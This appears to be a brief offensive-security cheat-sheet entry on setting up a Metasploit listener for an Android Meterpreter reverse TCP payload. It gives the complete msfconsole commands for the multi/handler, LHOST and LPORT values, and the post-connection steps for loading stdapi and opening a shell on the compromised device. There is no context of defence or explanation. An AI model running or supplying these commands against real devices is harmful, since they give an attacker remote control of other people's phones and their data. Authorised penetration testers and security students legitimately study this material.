---
title: Android Metasploit Listener Setup
category: android
subcategory: sub-10
os: linux
command: set payload android/meterpreter/reverse_tcp
tools: msfconsole
---


### Setup listener

```bash
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.1.16
set LPORT 4242
run
```

### After connection

```bash
load stdapi
shell
```
